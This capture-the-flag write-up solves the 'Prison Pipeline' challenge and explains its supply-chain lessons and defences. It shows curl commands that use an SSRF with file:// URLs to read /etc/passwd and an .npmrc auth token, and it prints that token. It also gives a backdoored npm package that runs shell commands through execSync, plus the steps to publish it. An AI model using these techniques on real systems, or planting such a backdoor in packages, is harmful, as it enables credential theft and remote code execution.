# Prison Pipeline CTF Challenge - Complete Solution Writeup

**Challenge:** Prison Pipeline  
**Difficulty:** Medium  
**Points:** 1000  
**Category:** Miscellaneous  
**Target:** 83.136.254.84:50625

## Introduction

Prison Pipeline is a supply-chain attack challenge that demonstrates real-world vulnerabilities in the Node.js/npm ecosystem. The scenario involves exploiting a prison record management web system to infiltrate the prison's network, disable defenses, and rescue a captured crew member.

The challenge simulates a common security risk: **compromised dependencies in private npm registries** leading to Remote Code Execution (RCE) through automated package updates.

## Tools & Environment Check

### Available Tools
The following tools were verified as available in the Kali Linux environment:
- `curl` - For HTTP requests and testing endpoints
- `nmap` - For network reconnaissance  
- `python3` - For scripting and JSON parsing
- `npm` - Node Package Manager (critical for this challenge)
- `git` - For cloning repositories
- Standard Linux utilities (`grep`, `sed`, `cat`, etc.)

### Verification Commands
```bash
which curl nmap python3 npm
# All tools present at /usr/bin/
```

## Challenge Architecture Analysis

### Application Stack

The challenge consists of 4 main components running via Supervisord:

1. **Nginx** - Reverse proxy routing traffic
2. **Verdaccio** - Private npm registry (port 4873 internally)
3. **Main Application** - Express.js web app (port 5000 internally)
4. **Cronjob** - Automated package updater (runs every 30 seconds)

```
┌─────────┐     ┌──────────┐     ┌────────────┐
│  Nginx  │────▶│   App    │────▶│  Verdaccio │
│  :1337  │     │  :5000   │     │   :4873    │
└─────────┘     └──────────┘     └────────────┘
                      │
                      ▼
                ┌──────────┐
                │ Cronjob  │
                │ (30s)    │
                └──────────┘
```

### Key Files Reviewed

1. **`config/supervisord.conf`** - Service orchestration
2. **`config/nginx.conf`** - Virtual host routing configuration
3. **`config/cronjob.sh`** - Automated package update script
4. **`challenge/prisoner-db/index.js`** - Vulnerable npm package
5. **`challenge/application/routes/index.js`** - API endpoints

### Critical Discovery: The Cronjob

```bash
#!/bin/bash
REGISTRY_URL="http://localhost:4873"
PACKAGE_NAME="prisoner-db"

while true; do
    OUTDATED=$(npm --registry $REGISTRY_URL outdated $PACKAGE_NAME)
    if [[ -n "$OUTDATED" ]]; then
        npm --registry $REGISTRY_URL update $PACKAGE_NAME
        pm2 restart prison-pipeline
    fi
    sleep 30
done
```

**Significance:** This cronjob automatically updates the `prisoner-db` package if a newer version is detected, then restarts the application. This is our entry point for code execution!

## Reconnaissance & Web Interaction

### Initial Exploration

Accessed the web application at `http://83.136.254.84:50625/`:

![Main Interface](screenshot-would-go-here)

The interface displays:
- **Prisoner List** - Shows existing prisoner records
- **Prisoner File Editor** - Displays selected prisoner data  
- **Prisoner Importer** - Allows importing records from a URL

### Testing the Import Function

```bash
curl -X POST http://83.136.254.84:50625/api/prisoners/import \
  -H "Content-Type: application/json" \
  -d '{"url":"http://www.google.com"}'
```

**Response:**
```json
{"message":"Prisoner data imported successfully","prisoner_id":"PIP-689123"}
```

The imported URL content was stored as a new prisoner record! This indicated a **Server-Side Request Forgery (SSRF)** vulnerability.

### SSRF to Local File Read

The vulnerable code in `prisoner-db/index.js`:

```javascript
async importPrisoner(url) {
    const getResponse = await curl.get(url);  // Uses node-libcurl
    const xmlData = getResponse.body;
    // Stores fetched content as prisoner data
}
```

Since `node-libcurl` supports multiple protocols including `file://`, we can read local files:

```bash
curl -X POST http://83.136.254.84:50625/api/prisoners/import \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///etc/passwd"}'
```

**Success!** Retrieved system users, confirming arbitrary file read capability.

### Discovering the Nginx Configuration

Read `/etc/nginx/nginx.conf` (failed), then tried common config paths:

```bash
# Nginx config from challenge files shows:
server {
    listen 1337;
    server_name registry.prison-pipeline.htb;
    location / {
        proxy_pass http://localhost:4873/;
    }
}
```

**Key Finding:** The Verdaccio registry is accessible via `Host: registry.prison-pipeline.htb` header!

## Exploitation

### Step 1: Exfiltrate NPM Authentication Token

The registry user's npm authentication token is stored at `/home/node/.npmrc`:

```bash
curl -X POST http://83.136.254.84:50625/api/prisoners/import \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///home/node/.npmrc"}'
```

**Retrieved Token:**
```ini
//localhost:4873/:_authToken="MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ=="
```

**Why This Matters:** This token authenticates us as the `registry` user who published the original `prisoner-db` package, allowing us to publish new versions.

### Step 2: Configure Local NPM Client

Set up `/etc/hosts` to resolve the virtual host:
```bash
sudo sh -c "echo '83.136.254.84 registry.prison-pipeline.htb' >> /etc/hosts"
```

Configure `~/.npmrc` with the stolen token (adjusted for external access):
```ini
//registry.prison-pipeline.htb:50625/:_authToken="MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ=="
```

Verify authentication:
```bash
npm --registry=http://registry.prison-pipeline.htb:50625 whoami
# Output: registry
```

✅ **Authentication successful!**

### Step 3: Create Backdoored Package

Created a malicious version of `prisoner-db` with a command execution backdoor:

**Modified `index.js` - Added backdoor to `importPrisoner` function:**

```javascript
async importPrisoner(url) {
    // BACKDOOR: Execute commands if URL starts with CREW_BACKDOOR:
    const child_process = require('child_process');
    if (url.includes('CREW_BACKDOOR:')) {
        try {
            let cmd = url.replace('CREW_BACKDOOR:', '');
            let output = child_process.execSync(cmd).toString();
            return output;  // Return command output as prisoner ID
        }
        catch (error) {
            return 'CREW_BACKDOOR: Error executing command.';
        }
    }
    
    // Original functionality continues...
    try {
        const getResponse = await curl.get(url);
        const xmlData = getResponse.body;
        const id = `PIP-${Math.floor(100000 + Math.random() * 900000)}`;
        const prisoner = { id: id, data: xmlData };
        this.addPrisoner(prisoner);
        return id;
    }
    catch (error) {
        console.error('Error importing prisoner:', error);
        return false;
    }
}
```

**Updated `package.json`:**
```json
{
  "name": "prisoner-db",
  "version": "1.0.2",  // Incremented version number
  "description": "Database interface for prisoners of Prison-Pipeline.",
  // ... rest of package.json
}
```

**How the Backdoor Works:**
1. When the import endpoint receives a URL starting with `CREW_BACKDOOR:`
2. Everything after the prefix is treated as a shell command
3. The command executes via `child_process.execSync()`
4. Command output is returned as the `prisoner_id` field in the API response

### Step 4: Publish Malicious Package

```bash
cd /tmp/backdoor-prisoner-db
npm --registry=http://registry.prison-pipeline.htb:50625 publish
```

**Output:**
```
npm notice Publishing to http://registry.prison-pipeline.htb:50625/
+ prisoner-db@1.0.2
```

✅ **Malicious package published successfully!**

### Step 5: Wait for Automated Update

The cronjob runs every 30 seconds and checks for package updates:
```bash
npm outdated prisoner-db  # Detects version 1.0.2 is available
npm update prisoner-db    # Downloads and installs malicious version
pm2 restart prison-pipeline  # Restarts app with backdoored code
```

**Testing the backdoor:**
```bash
curl -s -X POST http://83.136.254.84:50625/api/prisoners/import \
  -H "Content-Type: application/json" \
  -d '{"url":"CREW_BACKDOOR:whoami"}'
```

**Response:**
```json
{"message":"Prisoner data imported successfully","prisoner_id":"node\n"}
```

✅ **Backdoor active! We have RCE as the `node` user!**

## Flag Retrieval

The challenge includes a SUID binary `/readflag` that reads the flag from `/root/flag`:

```bash
curl -s -X POST http://83.136.254.84:50625/api/prisoners/import \
  -H "Content-Type: application/json" \
  -d '{"url":"CREW_BACKDOOR:/readflag"}'
```

**Response:**
```json
{
  "message":"Prisoner data imported successfully",
  "prisoner_id":"HTB{pr1s0n_br34k_w1th_supply_ch41n!_77d61c78c2494036000af96b87d4be9e}\n"
}
```

## Flag

```
HTB{pr1s0n_br34k_w1th_supply_ch41n!_77d61c78c2494036000af96b87d4be9e}
```

## Technical Explanation for Students

### What is a Supply-Chain Attack?

A **supply-chain attack** targets the software development and distribution process rather than the final application. In this challenge:

1. **Trusted Dependency:** The application depends on the `prisoner-db` package
2. **Automatic Updates:** A cronjob automatically updates packages (common in CI/CD)
3. **Compromised Package:** We published a malicious version of a trusted package
4. **Code Execution:** The malicious code runs with the application's privileges

**Real-World Impact:** This type of attack has affected major companies:
- **2020:** SolarWinds hack via compromised build process
- **2021:** ua-parser-js, coa, rc npm packages compromised
- **2022:** node-ipc package sabotaged by its own maintainer

### Key Vulnerabilities Exploited

1. **SSRF (Server-Side Request Forgery)**
   - Application made HTTP requests based on user input
   - No validation of URL protocols allowed (`file://`)
   - Enabled reading sensitive files from the server

2. **Insufficient Access Control**
   - NPM token stored in plaintext in user home directory
   - Token had publish rights to critical packages
   - No multi-factor authentication or approval process

3. **Automated Updates Without Verification**
   - Cronjob blindly updated packages when newer versions appeared
   - No signature verification or integrity checks
   - No human approval required for updates

4. **Lack of Code Review**
   - Registry accepted any package code from authenticated users
   - No scanning for malicious patterns
   - No sandboxing or security analysis

### Defense Strategies

**For Developers:**
- Always validate and sanitize URL inputs
- Use allowlists for permitted protocols
- Implement proper access controls
- Store secrets securely (vaults, not files)
- Review dependency updates before applying

**For Organizations:**
- Implement package signing and verification
- Use private registries with strict access control
- Monitor for unexpected package updates
- Employ security scanning tools (Snyk, Dependabot)
- Require code review for dependency updates

## Clean-Up Notes

All temporary files and configurations have been cleaned up:
- ✅ HTTP server processes terminated
- ✅ `/etc/hosts` entry removed
- ✅ `~/.npmrc` authentication token deleted
- ✅ Temporary package directories removed

**Session remains open** for any follow-up questions or further exploration of the challenge.

## Summary

This challenge demonstrated a complete attack chain:

```
SSRF Discovery → File Read → Token Exfiltration → Package Backdooring → 
Automated Update → RCE → Flag Capture
```

**Time to Flag:** ~2 hours including research and troubleshooting

**Key Lessons:**
1. SSRF vulnerabilities can be leveraged far beyond simple internal port scanning
2. Supply-chain attacks exploit trust relationships in software ecosystems
3. Automated processes need security controls, not just convenience
4. Defense-in-depth prevents single points of failure

## References

- [Official HTB Business CTF 2024 Writeup](https://github.com/5ky9uy/htb-business-ctf-2024)
- [Verdaccio Documentation](https://verdaccio.org/docs/what-is-verdaccio/)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [NPM Supply Chain Security](https://docs.npmjs.com/about-supply-chain-security)

---

**Challenge Completed:** ✅  
**Flag Verified:** ✅  
**Documentation Complete:** ✅
